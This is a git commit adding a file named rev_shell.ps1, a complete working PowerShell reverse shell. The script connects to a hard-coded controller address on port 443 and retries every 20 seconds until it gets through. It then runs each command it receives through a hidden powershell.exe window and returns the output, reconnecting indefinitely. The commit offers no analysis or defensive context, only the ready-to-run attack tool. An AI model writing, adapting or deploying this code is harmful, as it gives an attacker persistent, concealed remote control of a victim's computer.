2531c7e795f29f7c297cb5789ad9218111eef9d2
Lionnel RAZAFIMAHATRATRA <lionnelrazaf@gmail.com>
2024-07-25 15:00:50 +0300

    first

---
+++ rev_shell.ps1
@@ -0,0 +1,56 @@
+$local_host='192.168.1.86'
+$local_port=443
+$ConnectionDelay=20
+
+function Connect-ToController($local_host, $local_port) {
+    try {
+        $client=New-Object System.Net.Sockets.TcpClient
+        $client.Connect($local_host, $local_port)
+        return $client
+    }
+    catch {
+        return $null
+    }
+}
+
+while ($true) {
+    $conn = $null
+    while ($conn -eq $null) {
+        $conn = Connect-ToController -local_host $local_host -local_port $local_port
+        if ($conn -eq $null) {
+            Start-Sleep -Seconds $ConnectionDelay
+        }
+    }
+    try {
+        while ($true) {
+            $data = New-Object byte[] 1024
+            $read = $conn.GetStream().Read($data, 0, $data.Length)
+            $command = [System.Text.Encoding]::UTF8.GetString($data, 0, $read).Trim()
+            if ($command.ToLower() -eq 'exit') {
+                break
+            }
+            $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+            $startInfo.FileName = 'powershell.exe'
+            $startInfo.Arguments = $command
+            $startInfo.RedirectStandardOutput = $true
+            $startInfo.UseShellExecute = $false
+            $startInfo.CreateNoWindow = $true
+            $process = New-Object System.Diagnostics.Process
+            $process.StartInfo = $startInfo
+            $process.Start()
+
+            $output = $process.StandardOutput.ReadToEnd()
+            $process.WaitForExit()
+
+            $conn.GetStream().Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
+        }
+    }
+    finally {
+        $conn.Close()
+        Write-Host "Connection closed. Reconnecting in $ConnectionDelay seconds..."
+        Start-Sleep -Seconds $ConnectionDelay
+    }
+}
+
+
+
